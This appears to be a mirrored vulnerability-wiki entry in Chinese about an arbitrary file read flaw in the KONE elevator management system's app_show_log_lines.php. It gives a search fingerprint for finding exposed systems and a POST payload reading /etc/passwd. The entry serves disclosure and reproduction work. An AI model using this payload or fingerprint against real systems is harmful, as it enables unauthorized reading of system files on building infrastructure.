---
title: "KONE 通力电梯管理系统 app_show_log_lines.php 任意文件读取漏洞"
date: 2026-10-18 09:14:56
categories:
  - WebSecurity
  - CVE
  - "IoT"
  - "KONE-通力电梯管理系统"
tags:
  - "KONE-通力电梯管理系统"
  - "任意文件读取"
  - "漏洞复现"
---
## 漏洞描述

KONE 通力电梯 app_show_log_lines.php文件过滤不足导致任意文件读取漏洞

## 漏洞影响

```
KONE 通力电梯管理系统
```

## 网络测绘

```
"KONE Configuration management"
```

## 漏洞复现

主页面

![image-20220519184439370](https://raw.githubusercontent.com/Threekiii/Vulnerability-Wiki/master/docs-base/docs/iot/images/202205191844461.png)

发送POST请求包

```
fileselection=/etc/passwd
```

![image-20220519184600379](https://raw.githubusercontent.com/Threekiii/Vulnerability-Wiki/master/docs-base/docs/iot/images/202205191846469.png)

---

> 资料整理自 [Threekiii/Vulnerability-Wiki](https://github.com/Threekiii/Vulnerability-Wiki/blob/master/docs-base/docs/iot/KONE-%E9%80%9A%E5%8A%9B%E7%94%B5%E6%A2%AF%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F-app_show_log_lines.php-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E.md)
